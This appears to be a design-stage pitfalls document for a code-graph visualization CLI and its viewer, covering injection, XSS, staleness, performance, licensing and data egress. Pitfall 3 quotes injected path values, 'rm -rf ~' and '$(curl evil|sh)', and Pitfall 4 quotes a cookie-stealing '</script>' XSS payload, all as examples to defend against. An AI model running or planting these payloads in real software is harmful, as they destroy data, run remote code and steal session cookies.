# Pitfalls Research

**Domain:** Local code-graph visualization tool (CodeGraph CLI → normalized graph.json → React Flow 4-pane app + committable, client-presentable, agent-readable `docs/architecture/` bundle)
**Researched:** 2026-05-31
**Confidence:** HIGH (React Flow scale, CodeGraph staleness mechanics, tree-sitter limits, Node subprocess injection, `</script>` break-out, and all three licenses verified against primary sources; exact extraction-miss percentages MEDIUM)

> Phase names below are **proposed buckets** for the roadmap, not yet-decided phases. They map to the natural build order: **P0 Extraction & Schema** (CLI + CodeGraph wrapper + graph.json) → **P1 Viewer Core** (React Flow 4-pane + layout) → **P2 Export & Handoff Bundle** (SVG/PNG, self-contained HTML, ARCHITECTURE.md) → **P3 AI Pane** (optional/later) → **Cross-cutting: Security & Supply-chain** (touches every phase).

---

## Critical Pitfalls

### Pitfall 1: Presenting the extracted graph as ground truth (it has silent false negatives)

**What goes wrong:**
CodeGraph parses with tree-sitter into an AST and derives edges syntactically. tree-sitter **cannot represent runtime behavior** — dynamic dispatch (interface/virtual calls), reflection, runtime composition, dependency-injection wiring, event-bus/callback indirection, `import()` / dynamic require, and many re-export chains simply produce **missing edges**, not errors. The graph looks complete and authoritative. A client or teammate reads "module A does not call module B" off a clean diagram — and it's wrong. For a tool whose entire value proposition is "show what IS there," a confidently-wrong picture shown to a client is the worst failure mode.

**Why it happens:**
Static call-graph construction is provably incomplete for languages with dynamic dispatch, first-class functions, or function pointers (it needs alias analysis, which needs the call graph — a chicken-and-egg problem parsers don't solve). Empirically, framework-heavy apps are the worst case: a study of 13 static analyzers on 1000 apps found they missed ~61% of dynamically-executed methods on average, and **library/framework-resolved targets (exactly where DI and re-exports live) are the most-missed category.** The polished React Flow rendering makes the output *feel* more authoritative than the data underneath actually is.

**How to avoid:**
- **Never label the artifact "complete" or "the architecture."** Frame it as "statically-derived structure" in `ARCHITECTURE.md` and in the viewer UI.
- Embed an explicit **caveats/limitations block** in `ARCHITECTURE.md` and a visible footnote in the self-contained HTML viewer: "Static extraction. Dynamic dispatch, reflection, DI, and runtime-composed edges may be missing. Verify critical paths by reading code."
- Surface **extraction confidence/coverage signals** where cheap: node/edge/file counts from `codegraph status`, count of unresolved/external call sites, and a list of files the parser skipped or partially handled. Counts that look implausibly low for a known-large repo are the tell.
- Provide a one-click **"open this symbol's callers/callees in CodeGraph"** affordance (`codegraph callers/callees/context`) so a skeptical viewer can sanity-check a specific edge against the source of truth rather than trusting the picture.
- For the dogfood/demo repos, manually spot-check 3–5 edges you *know* exist (e.g., a DI-wired handler) and confirm whether they appear; document the result.

**Warning signs:**
- Edge count is suspiciously low relative to file/symbol count.
- A module you know is central appears nearly isolated (classic DI/event-bus miss).
- Re-export "barrel" files (`index.ts`) show as dead-ends with no outgoing edges.
- Reviewers say "but X obviously calls Y" — that's a missing edge, not a reviewer error.

**Phase to address:** P0 (capture coverage signals + unresolved-call counts at extraction; bake caveat fields into graph.json schema). P2 (render the caveat block + per-edge "verify in CodeGraph" affordance in viewer/HTML).

---

### Pitfall 2: Stale CodeGraph index → confidently wrong graph, committed to the repo

**What goes wrong:**
CodeGraph stores its index in `.codegraph/codegraph.db`. If `arch-viz scan` runs against a stale DB (repo changed since last index, branch switched, files added/deleted), the emitted `graph.json` describes **code that no longer exists** — then gets committed into `docs/architecture/` and presented as current. Unlike an agent's live MCP session (which has a file-watcher, a staleness banner, and connect-time catch-up), a **CLI script that just reads the DB gets none of those safety nets** and silently serializes the stale snapshot.

**Why it happens:**
CodeGraph's three anti-staleness mechanisms (debounced FS watcher, per-file staleness banner, connect-time catch-up) only fire inside an agent's `serve --mcp` session. CodeGraph's own docs say it explicitly: *"If you're scripting against the index outside an agent session, a single `codegraph sync` at the start of the script guarantees the index reflects the current working tree."* A scan tool that assumes "the DB is probably current" skips this and inherits whatever was last indexed — which after a `git pull` or branch switch can be arbitrarily wrong.

**How to avoid:**
- **`arch-viz scan` must run `codegraph sync` (or `index` if `.codegraph/` is absent) before reading.** `sync` is cheap — it reparses only changed files. Decision rule: no `.codegraph/` dir → `codegraph index`; `.codegraph/` exists → `codegraph sync`. Never read the DB without one of these first.
- **Stamp provenance into graph.json**: `generatedAt` (ISO timestamp), CodeGraph version, target repo path, target git commit SHA (if a git repo), and a hash/identifier of the DB or its node/edge/file counts from `codegraph status`. This is the audit trail that lets a future reader (human or agent) know *how stale* a committed artifact is.
- **Render provenance in the viewer and the HTML handoff** ("Generated 2026-05-31 from commit `a1b2c3d`, CodeGraph 0.9.4"). A client looking at a 6-month-old committed diagram should be able to see that at a glance.
- Optionally warn if the working tree's HEAD differs from the `gitCommit` baked into an existing `graph.json` ("graph may be stale; re-scan").
- **Node version guard:** CodeGraph hard-exits on Node 25.x (V8 WASM JIT bug crashes tree-sitter grammar compilation). The CLI should detect Node 25 and emit a clear actionable error rather than letting CodeGraph crash opaquely mid-scan.

**Warning signs:**
- `graph.json` references file paths that no longer exist in the repo.
- `generatedAt` predates recent commits.
- Node counts didn't change after a known large refactor.
- CodeGraph exits with "Zone allocator bug" / OOM (you're on Node 25).

**Phase to address:** P0 (sync-before-read is core CLI behavior; provenance is a graph.json schema field; Node-version guard). P2 (provenance display in viewer + HTML).

---

### Pitfall 3: Subprocess command injection when invoking CodeGraph

**What goes wrong:**
The CLI shells out to the CodeGraph binary with a user-supplied repo path. If that path is interpolated into a shell command string and run via `child_process.exec` (or `spawn`/`execFile` with `shell: true`), a path containing shell metacharacters — `;`, `|`, `` ` ``, `$()`, `&`, spaces, quotes — executes arbitrary commands. A repo path like `/tmp/repo; rm -rf ~` or a directory literally named `$(curl evil|sh)` becomes remote code execution on the developer's machine.

**Why it happens:**
`exec` spawns a shell and runs the whole string through it, so metacharacters in interpolated data are interpreted as syntax. Developers reach for `exec` because it's the simplest API and "it's just my own machine" — but this tool is **explicitly reusable across arbitrary repos** (project-agnostic, pointed at any folder), so the path is untrusted input by design. Escaping-by-hand is error-prone and a known anti-pattern.

**How to avoid:**
- **Use `execFile`/`spawn` with an args array and `shell: false` (the default). Never string-interpolate the repo path into a shell command.** Example shape:
  ```js
  execFile('codegraph', ['sync', '--path', repoPath], { cwd: repoPath }, cb)
  // NOT: exec(`codegraph sync --path ${repoPath}`)
  ```
  With an args array, the path is passed to the executable as one literal argument; shell metacharacters are inert data.
- **Do not set `shell: true`** anywhere — it re-enables the injection surface that the args array was protecting against.
- **Windows gotcha (this user is on Windows 11):** `execFile` cannot directly run `.bat`/`.cmd` files, and the common "fix" is `shell: true` — which reintroduces injection. Resolve the **actual executable** instead: locate CodeGraph's real entry (the `node` binary running CodeGraph's JS, or the resolved `.exe`/shim), and invoke that with an args array. If a `.cmd` shim is unavoidable, validate/whitelist the path strictly and still avoid `shell: true`.
- **Validate the repo path** as defense-in-depth: resolve to an absolute real path, confirm it's an existing directory, reject paths with control characters before passing to the subprocess.
- Apply the same args-array discipline to **every** subprocess (CodeGraph, git for commit SHA lookup, any future `d2`/`mmdc`).

**Warning signs:**
- Any `exec(` call with a `${...}` template literal containing a path.
- `shell: true` anywhere in the codebase.
- Tests don't include a repo path with a space or a `;` in it.

**Phase to address:** P0 (the CodeGraph wrapper is the first subprocess call — get it right at birth). Cross-cutting Security review on every subsequent subprocess.

---

### Pitfall 4: HTML/JS injection in the self-contained viewer (code symbols rendered into HTML)

**What goes wrong:**
The viewer renders code-derived strings — function names, file paths, symbol identifiers, doc snippets — into HTML. Source code legitimately contains characters that are HTML/JS-active. A function or file literally named `</script><img src=x onerror=alert(document.cookie)>` (valid in some languages, and trivially craftable in a test/adversarial repo) **executes** when rendered unescaped. Because the artifact is a **self-contained HTML file handed to clients/teammates** and opened by double-click, this is stored XSS that travels with the deliverable. The graph data was derived from someone's code; if that code (or a dependency's symbols) is hostile, the handoff file attacks whoever opens it.

**Why it happens:**
Two distinct sinks, two distinct escapes, and people apply the wrong one (or none):
1. **Symbols rendered as visible text** must be **HTML-escaped** (`<` → `&lt;`, `&` → `&amp;`, `"`/`'` in attributes). React escapes text children automatically — but `dangerouslySetInnerHTML`, manual `innerHTML`, or hand-built HTML-string templating (likely in the lightweight embedded viewer, see Pitfall 8) bypass it.
2. **The graph data embedded in a `<script>` block** is the sneaky one: the HTML parser scans for the literal `</script>` sequence *before* JS string parsing applies, so a string value containing `</script>` **breaks out of the script tag** even though it's "valid JSON." HTML-entity-encoding does **not** help inside `<script>`.

**How to avoid:**
- **Text sink:** Escape all code-derived strings for HTML before rendering. In the full React app, rely on React's default text escaping and **forbid `dangerouslySetInnerHTML` on any code-derived content**. In the lightweight embedded HTML viewer, use a tested escape helper, never string concatenation into `innerHTML`.
- **Embedded-data sink:** When inlining `graph.json` into a `<script>` tag, either (a) escape `</` to `<\/` (and ideally `<!--` and `]]>`), or (b) JSON-serialize then replace `<`/`>`/`&`/U+2028/U+2029 with `\uXXXX` escapes, and parse with `JSON.parse(...)` rather than treating it as raw JS. Prefer embedding as `<script type="application/json">` + `JSON.parse(textContent)` over `<script>var data = {...}</script>`.
- **Add a CSP `<meta>`** to the self-contained HTML where feasible (`script-src` without `'unsafe-inline'` is hard for a single file, but `object-src 'none'`, `base-uri 'none'`, and blocking external loads cheaply reduces blast radius).
- **Test with an adversarial fixture repo:** include symbols/paths containing `</script>`, `<img onerror>`, quotes, and `{{}}`/`${}` template-ish strings, build the HTML, open it, and confirm **nothing executes**. This is the single highest-value security test for this tool.

**Warning signs:**
- Any `dangerouslySetInnerHTML` / `innerHTML` / `insertAdjacentHTML` touching node labels, paths, or snippets.
- Graph data inlined as `<script>var GRAPH = {…}</script>` (raw JS context).
- No test fixture with a hostile symbol name.

**Phase to address:** P2 (the self-contained HTML viewer is where this artifact is produced — escaping + the adversarial fixture are P2 exit criteria). P1 (confirm the full app never uses `dangerouslySetInnerHTML` on code data).

---

### Pitfall 5: Large-graph "hairball" — unreadable diagram + React Flow performance collapse

**What goes wrong:**
Pointed at a real repo, naive extraction yields hundreds-to-thousands of nodes and a dense edge mesh. Two failures stack: (1) **legibility** — a fully-drawn graph becomes a "hairball" where no structure, clustering, or direction is visible; high-degree nodes (a logger, a util barrel, a base class) connect to everything and dominate the layout into noise; and (2) **performance** — React Flow renders nodes as DOM elements, so without care it degrades past ~80 nodes and crawls (single-digit FPS) at low thousands. A client demo on the tool's *own* repo or a mature repo turns into an unreadable, janky mess. This directly violates the HIGH quality bar.

**Why it happens:**
- **Legibility:** Cramming an entire network into one viewport gives each node/edge sub-pixel space; the hairball is a fundamental spatial problem, not a layout-tuning problem. High-degree "hub" nodes are the primary culprit and must be handled deliberately.
- **Performance:** React Flow has no fixed node cap, but every node position change can cascade re-renders through the whole `<ReactFlow>` if components aren't memoized and UI subscribes to the full nodes/edges arrays. Benchmarks show ~10 FPS (default nodes) to ~2 FPS (heavy nodes) **without** `React.memo`. "Heavy" custom node content (rich detail cards) makes it dramatically worse.

**How to avoid (legibility):**
- **Hierarchical layout from day one** — don't hand React Flow raw positions. Use **dagre** (drop-in, fast, tree/DAG-oriented — React Flow's own recommendation) for the default; reserve **ELK.js** for when you need fine control (accept its complexity). Custom-node layout gotcha: dagre needs node dimensions, so render → measure → layout.
- **Collapse-by-default + drill-down:** show modules/packages collapsed; expand to functions on demand (toggle `hidden`). This is both the legibility fix *and* the performance fix (fewer live DOM nodes).
- **Cluster/aggregate** into super-nodes by directory/module; let high-degree utility nodes be collapsible or filterable so one logger doesn't shred the layout.
- **Filter/threshold:** let the user hide leaf utilities, test files, or edges below a relevance threshold.

**How to avoid (performance):**
- **`React.memo` every custom node/edge component**; `useCallback`/`useMemo` for props (`nodeTypes`, `defaultEdgeOptions`, handlers). Highest-impact single fix.
- **Never subscribe whole sidebar/detail components to the full nodes/edges arrays** — keep selection in separate state so the detail pane doesn't re-render on every pan/drag.
- Keep node DOM light; move heavy detail to the dedicated detail pane (pane 3), not into every node.

**Render-engine fallback threshold (define it explicitly):**
- **≤ ~300–500 visible nodes:** React Flow (DOM/SVG) with memoization + collapse — fine, and you want React Flow's interactivity for the 4-pane UX.
- **~500–2,000:** React Flow only if aggressively collapsed/clustered; full expansion will hurt.
- **> ~2,000 simultaneously-visible elements:** DOM rendering is the wrong tool — switch to a **canvas/WebGL** renderer (Cytoscape.js's WebGL mode, or Sigma.js) for that view, or refuse to fully expand and force aggregation. (Real-world canvas data point: Cytoscape rendered blank at ~10k nodes but was fine at ~3k.)
- **Decision rule to bake into the tool:** if post-extraction node count exceeds a configurable threshold (suggest 500), **default to collapsed/aggregated view and surface a warning** ("Large graph: showing module-level view; expand selectively") rather than attempting to draw everything.

**Warning signs:**
- Dragging one node visibly lags or fans out re-renders (use React DevTools Profiler: optimized = only the dragged node highlights).
- The default view on a real repo is an indistinct ball of edges.
- One or two nodes have edges to a large fraction of all others.
- FPS tanks when panning/zooming.

**Phase to address:** P1 (layout engine, memoization discipline, collapse-by-default, and the node-count threshold/fallback are core viewer architecture — retrofitting performance later "requires significant changes in code logic," per the React Flow guidance, so decide early).

---

### Pitfall 6: Pulling a non-permissive dependency into the client-facing chain (license contamination)

**What goes wrong:**
The hard constraint is an **all-permissive client-visible chain**. The most dangerous, plausible mistake is letting **GitNexus** (PolyForm Noncommercial 1.0.0 — *source-available, not OSI open source, commercial use requires a paid license*) leak into a deliverable: its data format, an exported asset, a bundled snippet, or a runtime dependency reaching `docs/architecture/` outputs. Any of these makes the committed, client-presentable bundle non-commercial-licensed — a commercial blocker that may not surface until a client's legal review, long after shipping.

**Why it happens:**
GitNexus solves the same problem and is tempting for its richer in-browser graph. PolyForm Noncommercial is "permitted for any noncommercial purpose," so personal dogfooding *feels* fine — but the moment output ships to a client (a commercial context), the license is violated. Transitive deps are the silent vector: a convenience wrapper or a copied schema can drag a noncommercial component into the bundle without an obvious top-level `import`.

**How to avoid:**
- **Keep GitNexus strictly INTERNAL** (optional deep-read only), exactly as PROJECT.md mandates; assert in code/CI that no GitNexus artifact, type, or data is ever written into `docs/architecture/`.
- **Verify each shipped dependency's license before depending on it** (PROJECT.md says so explicitly): confirmed-permissive core is React Flow / `@xyflow/react` (**MIT**), D2 (**MPL-2.0**), Mermaid (**MIT**), CodeGraph (**MIT**). MPL-2.0 is file-level copyleft — fine to use, but if you *modify* D2 source files those files carry obligations (you're consuming D2's output/CLI, not forking it, so low risk — just don't vendor-and-edit MPL files into the bundle silently).
- **React Flow specifics:** MIT, free for commercial use, **no paid-gated features** — but the **renderer attribution badge** is removable only on a paid plan. For a client deliverable, either keep the attribution visible (allowed) or budget a plan to remove it; don't strip it without a license.
- **Automate license gating in CI:** run a license checker (e.g., `license-checker` / `license-checker-rseidelsohn`) over production deps and **fail the build** on anything not in an allowlist (MIT, ISC, BSD-2/3, Apache-2.0, MPL-2.0). Explicitly blocklist PolyForm-* / CC-NC / "Noncommercial."
- Pin the exact CodeGraph version you validated (`@colbymchenry/codegraph` 0.9.4 = MIT) and re-check the license on upgrade.

**Warning signs:**
- Any GitNexus import outside an internal-only module.
- A new dep whose license field is `UNLICENSED`, `SEE LICENSE`, `Custom`, or `PolyForm-*`.
- React Flow attribution removed with no paid plan on file.
- License-checker not wired into CI.

**Phase to address:** Cross-cutting Security/Supply-chain (license-allowlist CI from the first dependency install). P2 (verify the *shipped bundle's* chain specifically — it's a different, narrower set than dev deps).

---

### Pitfall 7: graph.json schema churn breaks AI-agent read/update and produces noisy diffs

**What goes wrong:**
`graph.json` is a **dual-consumer contract**: humans/clients read the rendered form, and **AI agents read AND update it** (a core requirement). If the schema changes without versioning/back-compat, every committed `graph.json` and every agent prompt/skill that parses it breaks silently — an agent updates a field that moved, or chokes on a shape it doesn't recognize, and corrupts the committed artifact. Compounding this: if node ordering or layout coordinates are **non-deterministic**, every re-scan rewrites the whole file even when nothing changed, burying real architectural diffs in churn and making `git diff` on the artifact useless.

**Why it happens:**
- **Schema:** Early iteration tempts ad-hoc field additions/renames. Without an explicit `schemaVersion`, consumers can't detect or adapt to changes, and "it's just JSON" hides the fact that it's an API.
- **Determinism:** CodeGraph extraction order, hash-map iteration, `Date.now()` timestamps, and layout algorithms (dagre/ELK without a fixed seed/order) all introduce run-to-run variation. The artifact is **committed to git**, so any instability shows up as diff noise on every regeneration.

**How to avoid:**
- **Version the schema explicitly** (`schemaVersion: "1.0.0"`) and document it in the repo (a `SCHEMA.md` or JSON Schema file). Bump on breaking changes; keep additive changes back-compatible. Agents and the viewer should read `schemaVersion` and refuse/adapt rather than mis-parse.
- **Validate on write and on read** against the JSON Schema so a malformed agent update is caught immediately, not after it's committed.
- **Enforce determinism:** sort nodes and edges by a stable key (e.g., file path + symbol name + line) before serialization; serialize object keys in stable order; round/quantize any floating-point layout coords; keep volatile provenance (timestamps, db hash) in a small dedicated header section so a content change in the *graph* is distinguishable from a mere re-timestamp.
- **Separate semantic graph from layout where possible:** if layout coordinates live in `graph.json`, a re-layout churns the file; consider computing layout in the viewer from a deterministic seed, or storing layout in a separate file so the semantic graph diffs cleanly.
- **Pretty-print with stable formatting** (consistent indentation, trailing newline) so diffs are line-oriented and reviewable.

**Warning signs:**
- Re-running `scan` on unchanged code produces a non-trivial `git diff`.
- No `schemaVersion` field.
- Agents/skills hardcode field paths with no version check.
- Layout coordinates change every run.

**Phase to address:** P0 (schemaVersion, JSON Schema, stable sorting, and the semantic-vs-layout split are foundational to the artifact — they're hard to retrofit once agents depend on the shape and files are committed across many repos).

---

### Pitfall 8: Self-contained HTML bloat — inlining the full React app into one file

**What goes wrong:**
The "self-contained HTML viewer that opens with no install" is meant to be handed to clients. The naive implementation inlines the **entire 4-pane React/Vite dev app** (React + React Flow + Tailwind + app code + the graph data) into a single file via something like `vite-plugin-singlefile`. The result is a multi-megabyte HTML file that's slow to open, awkward to email/commit, and carries the full interactive dev app's weight for what is fundamentally a **read-only handoff artifact**. The plugin's own maintainers state single-file bundling is "not recommended for most production situations" and is meant for "prototypes and simple tools."

**Why it happens:**
It's the path of least resistance — reuse the dev app build, flip on single-file mode, done. base64-inlined assets add ~33% overhead on top; un-tree-shaken React Flow + Tailwind is heavy; and the graph data is inlined on top of all of it. Nobody notices until the file is 5 MB and a client says "this won't open" or it bloats every target repo's git history.

**How to avoid:**
- **Decide the handoff artifact's identity deliberately:** the committable client-facing viewer should be a **lightweight, read-only embedded viewer**, not the full editing app. Options, roughly in order of preference:
  1. A **minimal purpose-built viewer** (small footprint, read-only pan/zoom/inspect, escaped rendering per Pitfall 4) that embeds `graph.json` — much smaller than the full app.
  2. If reusing the React app, build a **stripped "viewer" entry** (no editing/AI-pane code), enable `minify`, `removeViteModuleLoader: true`, and aggressive tree-shaking; use atomic CSS so Tailwind doesn't ship unused utilities.
- **Keep the full interactive 4-pane experience as the dev app** (run locally); the self-contained HTML is the *presentation* copy, optimized for "double-click and read."
- **Budget the file size** (suggest a soft cap, e.g., ≤ ~1–2 MB for the handoff HTML) and fail/warn the build if exceeded. Remember the SVG/PNG export + `ARCHITECTURE.md` already cover the static-presentation need — the HTML viewer adds *interactivity*, so it should justify its weight, not duplicate the static artifacts.
- For very large graphs, the embedded `graph.json` itself can dominate size — another reason aggregation/collapse (Pitfall 5) matters for the handoff copy.

**Warning signs:**
- The handoff HTML is several MB.
- The single-file build includes AI-pane / editing code that the read-only viewer never uses.
- Committing the bundle noticeably grows target repos' history.
- Tailwind/full React Flow shipped without tree-shaking.

**Phase to address:** P2 (the self-contained HTML and the lightweight-viewer-vs-full-app decision are squarely the export/handoff phase). Architecture note for P1: structure the app so a stripped read-only viewer entry is feasible, rather than entangling viewer and editor code.

---

### Pitfall 9: Path traversal when writing the artifact bundle into arbitrary target repos

**What goes wrong:**
`arch-viz scan <repo>` writes `graph.json`, `ARCHITECTURE.md`, `architecture.svg`, and `viz/index.html` into `<repo>/docs/architecture/`. If output paths are built by naively joining untrusted/derived strings (target repo path, or any path derived from symbol/file names used in output filenames) without normalization, a crafted input can escape the intended directory (`../../etc/...`, absolute paths, symlinked dirs) and **overwrite files outside `docs/architecture/`** — in the target repo or elsewhere on disk. Since the tool is pointed at arbitrary repos by design, the destination is attacker-influenceable.

**Why it happens:**
"It's writing into a directory I chose" feels safe, so developers `path.join(repo, 'docs/architecture', name)` with a `name` that may be derived from graph content, or accept a `--out` override and trust it. `path.join` does **not** prevent `..` escape, and symlinks in the target can redirect writes.

**How to avoid:**
- **Resolve and confine every write:** compute the absolute real path of the intended output dir, then for each file `path.resolve(outDir, name)` and **assert the result is still inside `outDir`** (string-prefix check on the normalized absolute path) before writing. Reject anything that escapes.
- **Never derive output *filenames* from untrusted graph content** (symbol/file names). Use a fixed, known set of output filenames (`graph.json`, `ARCHITECTURE.md`, `architecture.svg`, `viz/index.html`).
- **Validate the target repo path** (same as Pitfall 3: absolute, real, existing directory).
- **Be deliberate about overwrite:** the bundle is meant to be regenerated/committed, so overwriting the four known files is intended — but confirm you're not clobbering unrelated files, and consider a `--dry-run` that lists intended writes.
- Resolve symlinks (`realpath`) before the containment check so a symlinked `docs/architecture` can't redirect writes outside the repo.

**Warning signs:**
- Output path constructed with `path.join` and no post-normalization containment check.
- Any output filename derived from graph/symbol data.
- `--out` accepted without validation.

**Phase to address:** P0/P2 (path handling lives where the CLI writes the bundle — establish the confine-writes helper when the first file is written and reuse it for every artifact).

---

### Pitfall 10: AI-explanation pane silently sends client code to a third-party LLM

**What goes wrong (only if the optional AI pane ships):**
The AI-explanation pane sends a selected node's context (code snippets, symbol names, file paths) to an LLM to generate prose. If this happens **by default or implicitly**, the tool exfiltrates the client's/teammate's source code to a third-party API the moment someone clicks a node — a confidentiality and possibly contractual breach, especially for a tool meant to be run on *clients'* repos. Worse if secrets, internal paths, or proprietary logic ride along in the context.

**Why it happens:**
The feature *needs* code context to be useful, so the easy implementation pipes whatever the detail pane has straight to the model. "It's just for explanation" obscures that real proprietary code is leaving the machine. PROJECT.md already flags this; the risk is implementing it before the guardrails.

**How to avoid:**
- **Egress is explicit/opt-in, never default** (PROJECT.md constraint). No code leaves the machine until the user knowingly enables AI explanation and the destination is disclosed.
- **Show exactly what will be sent** before sending (the snippet/context payload), and to which provider/endpoint.
- **Redaction-aware:** scan the outgoing context for obvious secrets (API keys, tokens, `.env`-style values) and redact/block before egress; prefer a local model option where feasible.
- **No key hardcoding:** LLM API keys via environment variables only (global hard rule).
- **Per-repo/per-session consent** and an easy off switch; default the whole pane off.
- Keep the AI pane **out of the committed, client-facing bundle's runtime** — it's a local-dev affordance, not something baked into the handoff HTML that a client opens.

**Warning signs:**
- Network requests to an LLM endpoint fire without an explicit user action.
- No preview of the outgoing payload.
- API key read from a config file checked into a repo.
- AI-pane code present in the self-contained HTML viewer.

**Phase to address:** P3 (AI pane is optional/later — these guardrails are its entry criteria; don't ship the pane without them).

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| `exec()` with interpolated repo path instead of `execFile` + args array | One-line subprocess call | RCE on the dev machine via crafted path; tool is pointed at arbitrary repos | **Never** |
| Inline graph data as raw `<script>var G={…}</script>` instead of `JSON.parse` from escaped blob | Trivial to emit | `</script>` break-out XSS in a file handed to clients | **Never** |
| Read `.codegraph.db` without `sync`/`index` first | Faster scan | Commits a stale, wrong graph as "current" | Only if the CLI separately proves freshness (HEAD == baked commit) |
| Skip `schemaVersion` / JSON Schema on graph.json | Faster early iteration | Breaks agent updates + all consumers on first schema change; corrupts committed artifacts | Only pre-first-consumer; add before any agent/skill or second repo depends on it |
| Inline the full React dev app into the single-file HTML | Reuse existing build | Multi-MB handoff file; bloats every target repo's git | MVP demo only; replace with lightweight read-only viewer before client use |
| Non-deterministic node/layout ordering | No sorting work | Noisy `git diff` on every regenerate; real changes hidden | **Never** for a committed artifact |
| Render symbols via `dangerouslySetInnerHTML` for "rich" labels | Easy formatting | Stored XSS from hostile symbol names | **Never** on code-derived content |
| No license-checker in CI | Less setup | A noncommercial transitive dep silently contaminates the client chain; found at client legal review | **Never** for a commercial-facing tool |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| CodeGraph CLI (subprocess) | `exec` with interpolated path; assuming DB is current; opaque crash on Node 25 | `execFile`/`spawn` + args array, `shell:false`; `sync`/`index` before read; detect Node 25 and error clearly |
| CodeGraph data → graph.json | Treating extracted edges as complete ground truth | Caveat the output; surface coverage/unresolved counts; provide "verify in CodeGraph" drill-down |
| React Flow | No memoization; subscribing sidebars to full nodes/edges arrays; raw positions (no layout) | `React.memo` nodes/edges, `useCallback`/`useMemo` props; isolate selection state; dagre/ELK layout |
| dagre/ELK layout | Forgetting custom nodes need measured dimensions; non-seeded → unstable coords | Render → measure → layout; fix ordering/seed for deterministic coordinates |
| `vite-plugin-singlefile` | Inlining the whole app; assuming it's production-grade | Stripped read-only viewer entry; `minify` + `removeViteModuleLoader`; size budget |
| LLM API (if AI pane) | Implicit egress of client code; key in repo config | Explicit opt-in + payload preview + redaction; key via env var only |
| git (for provenance SHA) | `exec` with interpolated path; assuming repo is git | `execFile(['git','rev-parse','HEAD'])`; handle non-git folders (CodeGraph supports them) gracefully |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Unmemoized React Flow nodes/edges | Dragging one node lags; whole graph re-renders | `React.memo` + `useCallback`/`useMemo`; Profiler shows only dragged node | ~80 nodes unoptimized; ~2–10 FPS at low thousands |
| Drawing the full graph (no collapse/aggregation) | Indistinct hairball; pan/zoom janky; layout dominated by hub nodes | Collapse-by-default, cluster into super-nodes, filter leaf/util nodes | Hundreds of visible nodes (legibility); thousands (perf) |
| DOM/SVG renderer at high node counts | Blank canvas or crawl when fully expanded | Node-count threshold → force aggregation or switch to canvas/WebGL (Cytoscape WebGL / Sigma.js) | >~2,000 simultaneous elements (canvas blanked ~10k, fine ~3k in the wild) |
| Heavy custom node content | Big FPS drop vs default nodes | Keep node DOM light; move detail to pane 3 | Worsens steeply with rich per-node components |
| Embedded `graph.json` dominates single-file size | Multi-MB handoff HTML | Aggregate graph for the handoff copy; size budget; lightweight viewer | Large repos / fully-expanded graphs |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| `exec`/`shell:true` with repo path | Arbitrary command execution on dev machine | `execFile`/`spawn` + args array, `shell:false`; validate path; resolve real executable on Windows (don't `shell:true` for `.cmd`) |
| Unescaped code symbols in HTML viewer | Stored XSS in client-handed file (`</script><img onerror>` executes) | HTML-escape text sinks; no `dangerouslySetInnerHTML` on code data; escape `</`→`<\/` / `\uXXXX` for `<script>`-embedded JSON; `JSON.parse` from `type=application/json` |
| Path traversal on bundle write | Overwrite files outside `docs/architecture/` in arbitrary repos | Resolve + containment-check every output path; fixed output filenames; `realpath` to defeat symlink redirect |
| Noncommercial dep in client chain (GitNexus / CC-NC / PolyForm) | Commercial blocker; deliverable can't legally ship | License-allowlist CI (fail build); GitNexus internal-only; verify each shipped dep's license |
| Implicit LLM egress of client code | Confidential source exfiltrated to third party | Opt-in only + payload preview + redaction; local model option; key via env var |
| npm supply-chain (unpinned/unaudited deps) | Malicious/compromised package in a tool run on client repos | Commit lockfile; `npm audit` (or `pnpm audit`) in CI; pin versions; minimal dep surface; review new transitive deps |
| API/LLM key hardcoded | Key leak via committed bundle/config | Env vars only; never in graph.json, viewer, or committed config |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Diagram presented as authoritative/complete | Viewer trusts a graph with missing dynamic edges; makes wrong decisions | Visible "static extraction — may miss dynamic/DI/reflection edges" caveat + drill-down to verify |
| No provenance shown | Can't tell if a committed diagram is current or 6 months stale | Show `generatedAt` + commit SHA + CodeGraph version in viewer and HTML |
| Default full-graph view on a real repo | Unreadable hairball on first open; bad first impression to clients | Default to collapsed module-level view; expand on demand; warn on large graphs |
| Huge self-contained HTML | "It won't open" / slow; awkward to share | Lightweight read-only viewer; size budget; SVG/PNG for pure static needs |
| Silent stale-index scan | User commits a wrong artifact unknowingly | `sync` before read; warn if working tree differs from baked commit |
| No "verify this edge" affordance | Skeptical reviewer can't check a suspicious connection | One-click `codegraph callers/callees/context` for any node |

---

## "Looks Done But Isn't" Checklist

- [ ] **Subprocess calls:** Look done if they run — verify **no `exec`/`shell:true`**, every call uses `execFile`/`spawn` + args array, and a repo path containing a space and a `;` is in the test suite.
- [ ] **Self-contained HTML viewer:** Renders fine on a normal repo — verify with an **adversarial fixture** (symbols named `</script><img onerror=…>`, quotes, `${}`); confirm **nothing executes** and graph data is `JSON.parse`d from an escaped blob.
- [ ] **graph.json:** Parses fine — verify it has `schemaVersion`, validates against a JSON Schema, and **re-scanning unchanged code yields an empty `git diff`** (determinism).
- [ ] **Provenance:** Diagram looks current — verify `generatedAt`, target commit SHA, and CodeGraph version are present and **rendered** in both viewer and HTML.
- [ ] **Freshness:** Scan completes — verify it ran `sync`/`index` first and warns when the working tree differs from any baked commit.
- [ ] **License chain:** Builds and ships — verify a license-checker passes over **shipped** deps with a permissive allowlist, and **no GitNexus** artifact reaches `docs/architecture/`.
- [ ] **Large graph:** Works on a small repo — verify behavior on a 500+ node repo: collapsed default, acceptable FPS (Profiler shows only dragged node re-render), and a large-graph warning/threshold fires.
- [ ] **Extraction caveats:** Graph looks complete — verify the limitations block is present and a known DI/dynamic edge is either shown or its absence is acknowledged in docs.
- [ ] **Path writes:** Bundle lands in `docs/architecture/` — verify a malicious/symlinked target can't escape the output dir (containment check + `realpath`).
- [ ] **AI pane (if shipped):** Generates explanations — verify egress is opt-in, payload is previewed, redaction runs, key is from env, and the pane is **absent** from the handoff HTML.
- [ ] **Node version:** Scan works locally — verify Node 25.x is detected and errors clearly (CodeGraph crashes opaquely on it).

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
